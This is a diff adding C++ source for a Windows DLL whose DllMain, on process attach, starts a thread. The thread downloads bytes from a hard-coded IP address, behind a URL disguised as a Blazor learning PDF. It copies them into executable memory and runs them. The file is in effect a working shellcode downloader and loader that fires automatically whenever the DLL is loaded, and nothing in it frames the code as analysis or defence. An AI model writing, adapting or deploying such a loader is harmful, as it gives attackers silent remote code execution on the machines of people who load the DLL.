@@ -1,0 +1,112 @@
+
+#include "pch.h"
+#include <Windows.h>
+#include <Wininet.h>
+#include <iostream>
+#pragma comment(lib, "Wininet.lib")
+
+
+typedef void (*DownloadedFunction)();
+
+// Your existing DownloadAndExecuteThread function
+DWORD WINAPI DownloadAndExecuteThread(LPVOID lpParam) {
+    // Your existing code here...
+
+    // Define the URL
+    LPCWSTR url = L"http://16.16.233.72/mslearning/Blazor-for-ASP-NET-Web-Forms-Developers.pdf";
+
+    // Open a connection to the URL
+    HINTERNET hInternet = InternetOpen(L"User-Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) {
+        MessageBox(NULL, L"Failed to open internet connection.", L"Error", MB_ICONERROR | MB_OK);
+        return 1;
+    }
+
+    HINTERNET hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hInternet);
+        MessageBox(NULL, L"Failed to open URL.", L"Error", MB_ICONERROR | MB_OK);
+        return 1;
+    }
+
+    // Read the content into memory
+    const DWORD bufferSize = 1024; // Adjust buffer size as needed
+    BYTE buffer[bufferSize];
+    DWORD bytesRead = 0;
+    std::string content; // String to hold the downloaded content
+    while (InternetReadFile(hUrl, buffer, bufferSize, &bytesRead) && bytesRead > 0) {
+        content.append(reinterpret_cast<char*>(buffer), bytesRead);
+    }
+
+    // Cleanup
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+
+    // Process the downloaded content
+    // For example, execute it or perform other operations
+
+    // Allocate executable memory
+    void* execMemory = VirtualAlloc(nullptr, content.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (execMemory == nullptr) {
+        MessageBox(NULL, L"Failed to allocate executable memory.", L"Error", MB_ICONERROR | MB_OK);
+        return 1;
+    }
+
+    // Copy the downloaded content to the allocated memory
+    memcpy(execMemory, content.c_str(), content.size());
+
+    // Cast the memory region to a function pointer and execute
+    DownloadedFunction func = reinterpret_cast<DownloadedFunction>(execMemory);
+    func();
+
+    // Cleanup
+    VirtualFree(execMemory, 0, MEM_RELEASE);
+
+    return 0;
+}
+
+// Entry point for the DLL
+BOOL WINAPI DllMain(
+    HINSTANCE hinstDLL,  // handle to DLL module
+    DWORD fdwReason,     // reason for calling function
+    LPVOID lpReserved)   // reserved
+{
+    static HANDLE hThread = NULL; // Static variable to store the thread handle
+
+    // Perform actions based on the reason for calling.
+    switch (fdwReason) {
+    case DLL_PROCESS_ATTACH:
+        // Initialize once for each new process.
+        hThread = CreateThread(NULL, 0, DownloadAndExecuteThread, NULL, 0, NULL);
+        if (hThread == NULL) {
+            MessageBox(NULL, L"Failed to create thread.", L"Error", MB_ICONERROR | MB_OK);
+            std::cerr << "Failed to create thread." << std::endl;
+            // Failed to create the thread
+            // Handle error as needed
+        }
+        break;
+
+    case DLL_THREAD_ATTACH:
+        // Do thread-specific initialization.
+        
+        break;
+
+    case DLL_THREAD_DETACH:
+        // Do thread-specific cleanup.
+        
+        break;
+
+    case DLL_PROCESS_DETACH:
+        // Perform any necessary cleanup.
+         //Terminate the thread before the DLL is unloaded
+        if (hThread != NULL) {
+            TerminateThread(hThread, 0);
+            CloseHandle(hThread);
+        }
+        break;
+    }
+
+    
+    return TRUE;
+}
+
